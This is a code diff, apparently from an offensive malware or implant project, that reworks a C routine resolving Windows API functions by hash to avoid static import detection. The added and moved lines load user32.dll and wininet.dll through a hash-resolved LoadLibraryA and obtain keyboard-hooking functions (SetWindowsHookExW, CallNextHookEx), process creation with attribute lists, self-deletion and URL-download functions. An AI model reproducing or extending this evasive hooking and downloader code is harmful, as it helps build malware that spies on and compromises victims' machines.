@@ -85,39 +85,6 @@ API_HASHING g_Api = { 0 };
 // TODO: refactor
 BOOL InitializeWinApis()
 {
-	//	User32.dll exported
-	HMODULE hUser32Dll = GetModuleHandleByHashValue(USER32DLLHashValue);
-	if (hUser32Dll == NULL)
-		return FALSE;
-
-	g_Api.pCallNextHookEx = (fnCallNextHookEx)GetProcAddressByHashValue(
-		hUser32Dll,
-		CallNextHookExHashValue
-	);
-	g_Api.pDefWindowProcW = (fnDefWindowProcW)GetProcAddressByHashValue(
-		hUser32Dll,
-		DefWindowProcWHashValue
-	);
-	g_Api.pGetMessageW = (fnGetMessageW)GetProcAddressByHashValue(
-		hUser32Dll,
-		GetMessageWHashValue
-	);
-	g_Api.pSetWindowsHookExW = (fnSetWindowsHookExW)GetProcAddressByHashValue(
-		hUser32Dll,
-		SetWindowsHookExWHashValue
-	);
-	g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressByHashValue(
-		hUser32Dll,
-		UnhookWindowsHookExHashValue
-	);
-
-	if (g_Api.pCallNextHookEx == NULL ||
-		g_Api.pDefWindowProcW == NULL ||
-		g_Api.pGetMessageW == NULL ||
-		g_Api.pSetWindowsHookExW == NULL ||
-		g_Api.pUnhookWindowsHookEx == NULL)
-		return FALSE;
-
 	// 	Kernel32.dll exported
 	HMODULE hKernel32Dll = GetModuleHandleByHashValue(KERNEL32DLLHashValue);
 	if (hKernel32Dll == NULL)
@@ -167,7 +134,10 @@ BOOL InitializeWinApis()
 		hKernel32Dll,
 		CreateProcessAHashValue
 	);
-
+	g_Api.pLoadLibraryA = (fnLoadLibraryA)GetProcAddressByHashValue(
+		hKernel32Dll,
+		LoadLibraryAHashValue
+	);
 
 	if (g_Api.pFindResourceW == NULL ||
 		g_Api.pLoadResource == NULL ||
@@ -179,7 +149,9 @@ BOOL InitializeWinApis()
 		g_Api.pGetTickCount64 == NULL ||
 		g_Api.pSetFileInformationByHandle == NULL ||
 		g_Api.pGetEnvironmentVariableA == NULL ||
-		g_Api.pCreateProcessA == NULL)
+		g_Api.pCreateProcessA == NULL ||
+		g_Api.pLoadLibraryA == NULL
+		)
 		return FALSE;
 
 	// Kernelbase.dll exported
@@ -202,11 +174,46 @@ BOOL InitializeWinApis()
 
 	if (g_Api.pInitializeProcThreadAttributeList == NULL ||
 		g_Api.pUpdateProcThreadAttribute == NULL ||
-		g_Api.pDeleteProcThreadAttributeList == NULL)
+		g_Api.pDeleteProcThreadAttributeList == NULL
+		)
+		return FALSE;
+
+	//	User32.dll exported
+	HMODULE hUser32Dll = g_Api.pLoadLibraryA("user32.dll");
+	if (hUser32Dll == NULL)
+		return FALSE;
+
+	g_Api.pCallNextHookEx = (fnCallNextHookEx)GetProcAddressByHashValue(
+		hUser32Dll,
+		CallNextHookExHashValue
+	);
+	g_Api.pDefWindowProcW = (fnDefWindowProcW)GetProcAddressByHashValue(
+		hUser32Dll,
+		DefWindowProcWHashValue
+	);
+	g_Api.pGetMessageW = (fnGetMessageW)GetProcAddressByHashValue(
+		hUser32Dll,
+		GetMessageWHashValue
+	);
+	g_Api.pSetWindowsHookExW = (fnSetWindowsHookExW)GetProcAddressByHashValue(
+		hUser32Dll,
+		SetWindowsHookExWHashValue
+	);
+	g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressByHashValue(
+		hUser32Dll,
+		UnhookWindowsHookExHashValue
+	);
+
+	if (g_Api.pCallNextHookEx == NULL ||
+		g_Api.pDefWindowProcW == NULL ||
+		g_Api.pGetMessageW == NULL ||
+		g_Api.pSetWindowsHookExW == NULL ||
+		g_Api.pUnhookWindowsHookEx == NULL
+		)
 		return FALSE;
 
 	// Wininet.dll exported
-	HMODULE hWininetDll = GetModuleHandleByHashValue(WININETHashValue);
+	HMODULE hWininetDll = g_Api.pLoadLibraryA("wininet.dll");
 	if (hWininetDll == NULL)
 		return FALSE;
 
@@ -235,7 +242,8 @@ BOOL InitializeWinApis()
 		g_Api.pInternetOpenUrlW == NULL ||
 		g_Api.pInternetReadFile == NULL ||
 		g_Api.pInternetCloseHandle == NULL ||
-		g_Api.pInternetSetOptionW == NULL)
+		g_Api.pInternetSetOptionW == NULL
+		)
 		return FALSE;
 
 	return TRUE;
